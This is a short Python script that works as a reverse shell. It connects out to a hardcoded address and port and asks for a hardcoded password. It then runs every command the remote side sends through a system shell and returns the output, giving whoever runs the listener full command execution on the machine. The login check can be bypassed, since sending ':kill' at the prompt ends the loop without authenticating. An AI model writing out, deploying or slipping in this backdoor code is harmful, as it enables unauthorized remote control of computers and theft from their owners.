import socket
import subprocess

host = '127.0.0.1'
port = 8080
password = 'supersecret'

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))

# login loop
while True:
    sock.send('Login: '.encode())
    passwd = sock.recv(1024).decode().strip()
    if passwd.strip() == ':kill':
        break
    if password == passwd:
        break

# code loop
while True:
    try:
        sock.send('#>'.encode())
        data = sock.recv(1024).decode().strip()

        if data == ':kill':
            break

        proc = subprocess.Popen(
            data,
            shell = True,
            stdin = subprocess.PIPE,
            stdout = subprocess.PIPE,
            stderr = subprocess.PIPE)
        stdout = proc.stdout.read()
        stderr = proc.stderr.read()
        sock.send(stdout)
    except:
        break